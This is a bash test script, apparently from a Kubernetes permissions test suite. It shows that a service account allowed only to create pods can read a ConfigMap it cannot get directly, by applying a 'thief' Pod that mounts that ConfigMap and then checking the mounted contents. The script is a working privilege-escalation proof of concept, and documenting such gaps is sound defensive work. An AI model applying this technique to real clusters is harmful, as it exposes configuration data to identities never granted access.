#!/usr/bin/env bash
# Implicit permission: create Pod -> get ConfigMap   (pod-create-reads-configmap)
#
# Proof: an identity granted ONLY `create pods` in a namespace cannot `get
# configmaps` there, yet by authoring a Pod that mounts a ConfigMap it obtains
# the ConfigMap's bytes -- the kubelet reads the ConfigMap on the identity's
# behalf (Node authorizer pod->configmap edge, VisitPodConfigmapNames).
# Mechanism: ../transitions/pod-create-reads-configmap.md
#   when: resource1.namespace == resource.namespace
#         && resource1.configMapRefs.contains(resource.name)
source "$(dirname "$0")/../lib.sh"
test_start "pod-create-reads-configmap"

ns="$(new_ns pod-cm)"
cm_val="cfg-${RUN_ID}"

# Pre-existing cluster state: a ConfigMap the attacker must never read directly.
step "admin creates ConfigMap 'target' holding key=$cm_val"
K -n "$ns" create configmap target --from-literal=key="$cm_val" >/dev/null \
  || fail "could not create target configmap"

# Attacker identity: ONLY `create pods` (plus get pods, to see its own pod).
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "pods" "create,get,list"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: the attacker holds p (create pods) but not q (get configmaps).
assert_can    "$subj" create pods       "$ns"
assert_cannot "$subj" get    configmaps "$ns"

# ACT (as attacker, exercising ONLY p): author a Pod that mounts the ConfigMap.
step "attacker creates a Pod that mounts ConfigMap 'target' as a volume"
as_subj "$subj" -n "$ns" apply -f - >/dev/null <<EOF || fail "attacker could not create the pod"
apiVersion: v1
kind: Pod
metadata: { name: thief }
spec:
  automountServiceAccountToken: false
  containers:
  - name: c
    image: ${IMG}
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 3600"]
    volumeMounts: [{ name: cm, mountPath: /mnt/cm, readOnly: true }]
  volumes:
  - name: cm
    configMap: { name: target }
EOF

# EFFECT: the kubelet mounted the ConfigMap into the attacker's container.
# Observation is done by admin (the attacker only did `create`).
wait_pod_running "$ns" thief 90
got="$(K -n "$ns" exec thief -- cat /mnt/cm/key 2>/dev/null)"
assert_eq "$got" "$cm_val" "configmap bytes delivered into the attacker's pod"
step "kubelet delivered the ConfigMap bytes ($got) into a Pod authored with only 'create pods'"

test_pass
